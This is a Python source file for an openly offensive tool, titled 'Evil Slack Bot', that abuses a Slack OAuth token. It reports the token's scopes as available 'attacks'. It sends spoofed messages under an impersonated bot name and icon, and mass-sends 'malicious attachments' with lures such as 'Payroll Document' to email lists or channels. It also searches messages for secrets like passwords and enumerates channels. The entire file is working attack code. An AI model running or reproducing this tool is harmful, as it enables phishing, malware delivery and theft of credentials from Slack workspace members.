#! /usr/bin/env python3

from slack import WebClient
from slack.errors import SlackApiError
import argparse,time
from colorama import Fore, init

# Added text color
init(autoreset=True)
red = Fore.RED
green = Fore.GREEN
blue = Fore.BLUE
white = Fore.WHITE
def div():
    print('------------------------------------------')
def title():
    print(green + '''
    ______      _ __      
   / ____/   __(_) /      
  / __/ | | / / / /       
 / /___ | |/ / / /        
/_______|___/_/_/     __  
  / ___// /___ ______/ /__
  \__ \/ / __ `/ ___/ //_/
 ___/ / / /_/ / /__/ ,<   
/_______\__,_/\___/_/|_|  
   / __ )____  / /_       
  / __  / __ \/ __/       
 / /_/ / /_/ / /_         
/_____/\____/\__/
''')

# List of tokens permissions

def token_attacks(perms):
    if 'search:read' in perms:
        print(blue + str(parse._option_string_actions['-s'].option_strings),parse._option_string_actions['-s'].help)
    if 'chat:write.customize' in perms:
        print(blue + str(parse._option_string_actions['-sP'].option_strings),parse._option_string_actions['-sP'].help)
    if 'chat:write' in perms:
        print(blue + str(parse._option_string_actions['-m'].option_strings),parse._option_string_actions['-m'].help)
    if 'files:write' in perms:
        print(blue + str(parse._option_string_actions['-a'].option_strings),parse._option_string_actions['-a'].help)    
    if 'users:read.email' not in perms and args.email != None:
        print(red+'ERROR: Your provided token does not have the users:read.email permission. You can not use -eL or -e to lookup via email')
        exit()
    if 'users:read.email' not in perms and args.email_list != None:
        print(red+'ERROR: Your provided token does not have the users:read.email permission. You can not use -eL or -e to lookup via email')
        exit()
        
def checkperms():
    check = t.api_call('auth.test')
    perms = check.headers['x-oauth-scopes'].split(',')
    name = check['user']
    div()
    print(green + 'This token belongs to a bot named: ' + blue+name.title())
    div()
    print(green + 'The permissions for your token are:',red + str(perms))
    div()
    print(green + 'This token allows the following attacks:')
    token_attacks(perms)
    return perms

def checks():
    # Check tokens permissions
    if args.check == True:
       checkperms()
       exit()
    else:
        perms = checkperms()
        
    # Check that there's only one sending argument at a time
    e_and_eL = args.email != None and args.email_list != None
    e_and_cH = args.email != None and args.channel != None
    eL_and_cH = args.email_list != None and args.channel != None
    if e_and_eL or e_and_cH or eL_and_cH: 
        print(red+'Error: -e,-eL, and -cH can not be used together')
        exit()

    # Check that there's only one sending attack argument at a time
    m_and_sP = args.message != False and args.spoof != False
    m_and_a = args.message != False and args.attach != False
    m_and_s = args.message != False and args.search != False
    a_and_sP = args.attach != False and args.spoof != False
    a_and_s = args.attach != False and args.search != False
    s_and_sP = args.search != False and args.spoof != False
    if m_and_sP or m_and_a or m_and_s or a_and_sP or a_and_s or s_and_sP:
        print(red+'Error: -m,-sP, -a and -s can not be used together')
        exit()
    return perms

# Lookup channel_id
def lookupByChannel():
    lookup = t.conversations_list(types="public_channel,private_channel")
    channel_list = lookup['channels']
    channels = {}
    for chan in range(0,len(channel_list)):
        name = channel_list[chan]['name']
        chan_id = channel_list[chan]['id']
        channels[name] = chan_id
    try:
        channel_id = channels[args.channel]
    except:
        print(red+'ERROR: '+white+args.channel+red+' channel not found')
        exit()
    user_id = channel_id
    return user_id

def listChannels():
    lookup = t.conversations_list(types="public_channel,private_channel",limit="999")
    cursor_list = lookup['response_metadata']['next_cursor']
    channel_list = lookup['channels']
    div()
    print(blue+'Searching for channels:')
    while True:
        if lookup['response_metadata']['next_cursor']:
            try:
                lookup = t.conversations_list(types="public_channel,private_channel",limit="999", cursor=cursor_list)
                cursor_list = lookup['response_metadata']['next_cursor']
                channel_list += lookup['channels']
            except SlackApiError as e:
                print(red+'ERROR: '+white+e.response['error'])
                print(blue+'Slack API ratelimits to 19,980 channels found per minute')
                print(red+'Sleeping for: '+white+'60 seconds to refresh ratelimit')
                time.sleep(61)
                print(blue+'Resuming search for channels:')
        else:
            break           
    if args.outfile != None:
            print(green+'Results printed to: '+white+args.outfile)
    for chan in range(0,len(channel_list)):
        name = channel_list[chan]['name']
        if args.outfile != None:
            with open(args.outfile, 'a') as o:
                o.write(name+'\n')
        else:
            print(name)
        
# lookup userid by email address
def lookupByEmail():
    try:
        lookup = t.api_call("users.lookupByEmail?email=" + args.email)
        user_id = lookup['user']['id']
        return user_id
    except SlackApiError:
        print(red+'ERROR: '+ white+args.email.strip() + red+' not found in Slack')
        raise Exception

# Send spoofed message
def setupSpoofMessage():
    div()
    botname = input(green+'Type the name you\'d like to impersonate\n'+blue+'Example: '+white+'SecurityBot\n'+white)
    div()
    icon = input(green+'Type the URL to an image you\'d like to use as your profile photo\n'+white)
    div()
    message = input(green+'Type your slack message\n'+blue+'Example: '+white+'You have been mentioned in <https://google.com|Doc-3972>\n'+white)
    div()
    print(blue+'Spoofed name is: ' + white+botname + '\n'+
          blue+'Icon URL: ' + white+icon + '\n'+
          blue+'Slack Message: ' + white+message + '\n'
        )
    div()
    ready = input(red+'Ready to send your message? y/n\n'+white)
    if ready != 'y' and ready != 'yes' and ready != 'Y':
        print(red+'Message was not sent')
        setupSpoofMessage()
    elif args.email_list != None:
        sendMessageToList(botname,icon,message)
    elif args.email != None:
        user_id = lookupByEmail()
        sendMessage(user_id,botname,icon,message)
        print(green+'Message sent to '+white+args.email)
    elif args.channel != None:
        user_id = lookupByChannel()
        sendMessage(user_id,botname,icon,message)
        print(green+'Message sent to '+white+args.channel)

# Send non-spoofed message
def setupMessage():
    div()
    message = input(green+'Type your slack message\n'+blue+'Example: '+white+'You have been mentioned in <https://google.com|Doc-3972>\n'+white)
    div()
    print(
          blue+'Slack Message: \n' + white+message 
        )
    div()
    botname,icon = '',''
    ready = input(red+'Ready to send your message? y/n\n'+white)
    if ready != 'y' and ready != 'yes' and ready != 'Y':
        print(red+'Message was not sent')
        setupMessage()
    elif args.email_list != None:
        sendMessageToList(botname,icon,message)
    elif args.email != None:
        try:
            user_id = lookupByEmail()
            sendMessage(user_id,botname,icon,message)
            print(green+'Message sent to '+white+args.email)
        except:
            exit()
    elif args.channel != None:
        user_id = lookupByChannel()
        sendMessage(user_id,botname,icon,message)
        print(green+'Message sent to '+white+args.channel)

# Sending to single target
def sendMessage(user_id,botname,icon,message):
    try:
        send = t.chat_postMessage(
            channel=user_id,
            username=botname,
            icon_url=icon,
            text=message
        )
    except SlackApiError as e:
        print(red+'ERROR: '+white+e.response['error'])
        exit()
# Sending to list of targets
def sendMessageToList(botname,icon,message):
    r = open(args.email_list)
    div()
    for address in r.readlines():
        try:
            user_id = lookupByEmailList(address)
            sendMessage(user_id,botname,icon,message)
            print(green+"Message sent to: " + white+address)
        except:
            print(red+'ERROR: '+ white+address.strip() + red+' was not found in Slack. Message was not sent\n')
            pass
    r.close()

# Lookup slack userid for each email in list
def lookupByEmailList(email_address):
    lookup = t.api_call("users.lookupByEmail?email=" + email_address)
    user_id = lookup['user']['id']
    return user_id

# Setup the message to be sent with attachment
def setupFileMessage():
    div()
    message = input(green + 'Type the slack message to accompany your malicious file\n'+blue+'Example: '+white+'Please take a look at this report asap!\n'+white)
    div()
    file_title=input(green + 'Type the title of your file\n'+blue+'Example: '+white+'Payroll Document\n'+white)
    div()
    print(
          blue+'Slack Message: ' + white+message +'\n'+
          blue+'Title of file: ' + white+file_title+'\n'+
          blue+'Attached File: ' + white+args.file
        )
    div()
    ready = input(red + 'Ready to send your message? y/n\n'+white)
    if ready != 'y' and ready != 'yes' and ready != 'Y':
        print(red+'Message was not sent')
        setupFileMessage()
    elif args.email_list != None:
        sendFileToList(message,file_title)
    elif args.email != None:
        try:
            user_id = lookupByEmail()
            sendFile(user_id,message,file_title)
            print(green+'File sent to '+white+args.email)
        except:
            exit()
    elif args.channel != None:
        user_id = lookupByChannel()
        sendFile(user_id,message,file_title)
        print(green+'File sent to '+white+args.channel)

def sendFileToList(message,file_title):
    r = open(args.email_list)
    for address in r.readlines():
        try:
            user_id = lookupByEmailList(address)
            sendFile(user_id,message,file_title)
            print(green+"File sent to: " + white+address)
        except:
            print(red+'ERROR: '+ white+address.strip() + red+' was not found in Slack. Message was not sent\n')
            pass
            
    r.close()

def sendFile(user_id,message,file_title):
    try:
        send = t.files_upload(
        channels=user_id,
        file=args.file,
        title=file_title,
        initial_comment=message,
        )
    except SlackApiError as e:
        print(red+'ERROR: '+white+e.response['error'])
        exit()

# Search for secret using keyword
def keywordSearch():
    div()
    keyword = input(green+'Type the keyword you\'d like to search for.\n'+blue+'Example: '+white+'password\n'+white)
    div()
    search = t.search_messages(
    query = keyword,
    sort = "timestamp",
)
    searchData = search.data['messages']['matches']
    count = len(searchData)
    print(green+'Searching for keyword: '+white+keyword)
    if count == 0:
        print(red+'ERROR: Zero results returned')
    for data in range(count):
        if args.outfile != None:
            with open(args.outfile, 'a') as o:
                o.write(searchData[data]['text'] + '\n')
        else:
            print(searchData[data]['text'])
    if args.outfile != None and count != 0:
        print(blue+'Search results printed to: '+white+args.outfile)

# Looks for arguements and runs the associated functions if valid
def start(perms):
    if args.channel_list == True:
        if 'channels:read' not in perms:
            div()
            print(red + 'ERROR: Your provided token does not have the channels:read permission.',
                  red + 'You can not list channels'
                  )
            exit()
        else:
            listChannels()
            exit()
    if args.spoof == True:
        if 'chat:write.customize' not in perms:
            div()
            print(red + 'ERROR: Your provided token does not have the chat:write.customize permission.',
                  red + 'You can not send a spoofed message'
                  )
            exit()
        if 'channels:read' not in perms and args.channel != None:
            div()
            print(red + 'ERROR: Your provided token does not have the channels:read permission.',
                  red+'You can not send messages to channels'
                  )
        if 'chat:write.public' not in perms and args.channel != None:
            div()
            print(red + 'WARNING: Your provided token does not have the chat:write.public permission.',
                  red+'You can not send messages to a channel if your bot is not already a member of that channel'
                  )
        if args.email == None and args.email_list == None and args.channel == None:
            div()
            print(red + 'ERROR: -sP/--spoof requires --email,--email_list, or --channel')
            exit()
        else:
            setupSpoofMessage()
    if args.message == True:
        if 'chat:write' not in perms:
            div()
            print(red + 'ERROR: Your provided token does not have the chat:write permission.',
                  red+'You can not send a spoofed message'
                  )
            exit()
        if 'channels:read' not in perms and args.channel != None:
            div()
            print(red + 'ERROR: Your provided token does not have the channels:read permission.',
                  red+'You can not send messages to channels'
                  )
            exit()
        if 'chat:write.public' not in perms and args.channel != None:
            div()
            print(red + 'WARNING: Your provided token does not have the chat:write.public permission.',
                  red+'You can not send messages to a channel if your bot is not already a member of that channel'
                  )
        if args.email == None and args.email_list == None and args.channel == None:
            div()
            print(red + 'ERROR: -m/--message requires --email,--email_list, or --channel')
            exit()
        else:
            setupMessage()
    if args.attach == True:
        if 'files:write' not in perms:
            div()
            print(red + 'ERROR: Your provided token does not have the files:write permission.',
                  red+'You can not send a malicious attachment'
                  )
            exit()
        if 'channels:read' not in perms and args.channel != None:
            div()
            print(red + 'ERROR: Your provided token does not have the channels:read permission.',
                  red+'You can not send messages to channels'
                  )
            exit()
        if 'chat:write.public' not in perms and args.channel != None:
            div()
            print(red + 'WARNING: Your provided token does not have the chat:write.public permission.',
                  red+'You can not send messages to a channel if your bot is not already a member of that channel'
                  )
        if args.email == None and args.email_list == None and args.channel == None:
            div()
            print(red + 'ERROR: -a/--attach requires --email,--email_list, or --channel')
            exit()
        if args.file == None:
            div()
            print(red + 'ERROR: -a/--attach requires -f/--file')
            exit()
        else:
            setupFileMessage()
    if args.search == True:
        if 'search:read' not in perms:
            div()
            print(red + 'ERROR: Your provided token does not have the search:read permission.',
                  red + 'You can not do a keyword search for secrets'
                  )
            exit()
        else:
            keywordSearch()
def setupArgparse():
    group_req = parse.add_argument_group("Required")
    group_attack = parse.add_argument_group("Attacks")
    group_args = parse.add_argument_group("Arguments")
    # Display help page
    group_req.add_argument('-t','--token',help='Slack Oauth token',action='store',required=True)
    group_attack.add_argument('-sP','--spoof',help='Spoof a Slack message, customizing your name, icon, etc (Requires -e,-eL, or -cH)',action='store_true')
    group_attack.add_argument('-m','--message',help='Send a message as the bot associated with your token (Requires -e,-eL, or -cH)',action='store_true')
    group_attack.add_argument('-s','--search',help='Search slack for secrets with a keyword',action='store_true')
    group_attack.add_argument('-a','--attach',help='Send a message containing a malicious attachment (Requires -f and -e,-eL, or -cH)',action='store_true')
    group_args.add_argument('-f','--file',help='Path to file attachment',action='store')
    group_args.add_argument('-e','--email',help='Email of target',action='store')
    group_args.add_argument('-cH','--channel',help='Target Slack Channel (Do not include #)',action='store')
    group_args.add_argument('-eL','--email_list',help='Path to list of emails separated by newline',action='store')
    group_args.add_argument('-c','--check',help='Lookup and display the permissions and available attacks associated with your provided token.',action='store_true')
    group_args.add_argument('-o','--outfile',help='Outfile to store search results',action='store')
    group_args.add_argument('-cL','--channel_list',help='List all public Slack channels',action='store_true')
    
def main():
    title()
    perms = checks()
    start(perms)

if __name__ == '__main__':
    parse = argparse.ArgumentParser()
    setupArgparse()
    args = parse.parse_args()
    t = WebClient(args.token)
        
    main()
